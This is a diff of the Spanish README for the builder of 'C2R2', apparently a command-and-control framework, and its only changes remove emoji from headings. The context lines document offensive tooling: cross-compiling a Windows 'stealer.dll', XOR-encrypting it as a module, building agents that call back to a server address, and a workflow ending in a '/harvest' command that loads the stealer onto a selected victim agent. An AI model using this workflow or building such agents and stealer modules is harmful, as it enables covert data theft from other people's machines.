@@ -2,7 +2,7 @@
 
 Generador de agentes y módulos para C2R2.
 
-## 🎯 Funcionalidad
+##  Funcionalidad
 
 El builder tiene dos comandos principales:
 
@@ -22,7 +22,7 @@ Encripta `stealer.dll` con XOR y lo prepara para ser usado con `/harvest`:
 - Encripta DLL
 - Guarda `c2r2-server/modules/stealer.enc` y `stealer.key`
 
-## 📋 Prerequisitos
+##  Prerequisitos
 
 ### Instalar MinGW-w64 (cross-compilation para Windows)
 
@@ -43,7 +43,7 @@ cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
 # Esto genera: target/x86_64-pc-windows-gnu/release/stealer.dll (~2 MB)
 ```
 
-## 🚀 Uso
+##  Uso
 
 **Nota**: Los comandos se pueden ejecutar desde el directorio raíz del proyecto o desde `builder/`.
 
@@ -64,7 +64,7 @@ cargo run -p builder -- build-agent --name prod_agent --server 192.168.1.100:444
 cargo run -p builder -- encrypt-module
 ```
 
-## 📦 Archivos Generados
+##  Archivos Generados
 
 ### `build-agent`
 
@@ -81,7 +81,7 @@ c2r2-server/modules/
 └── stealer.key              ← Clave XOR (32 bytes)
 ```
 
-## 🔒 Arquitectura Modular
+##  Arquitectura Modular
 
 ### Flujo de `/harvest`
 
@@ -97,7 +97,7 @@ C2R2[1]> /harvest
 7. Agent limpia archivos temporales
 ```
 
-## 🛠️ Workflow Completo
+##  Workflow Completo
 
 ```bash
 # 1. Compilar stealer DLL (Windows target desde Linux)
@@ -123,7 +123,7 @@ C2R2> /select 1
 C2R2[1]> /harvest
 ```
 
-## 📝 Notas
+##  Notas
 
 - El agent **NO** incluye código de stealer (más ligero: ~500 KB vs 2.5 MB)
 - El módulo se transfiere **solo cuando se ejecuta** `/harvest`
